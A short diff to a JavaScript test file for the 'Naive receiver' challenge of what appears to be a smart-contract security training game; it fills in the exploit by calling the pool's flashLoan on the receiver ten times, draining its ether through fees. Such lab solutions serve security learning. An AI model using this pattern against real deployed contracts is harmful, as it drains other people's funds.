@@ -31,6 +31,10 @@ describe('[Challenge] Naive receiver', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */   
+        // calling flashloan 10 times from pool to receiver will empty the ethers in receiver
+        for (let i = 0; i<10; i++) {
+            await this.pool.flashLoan(this.receiver.address, 0)
+        }
     });
 
     after(async function () {
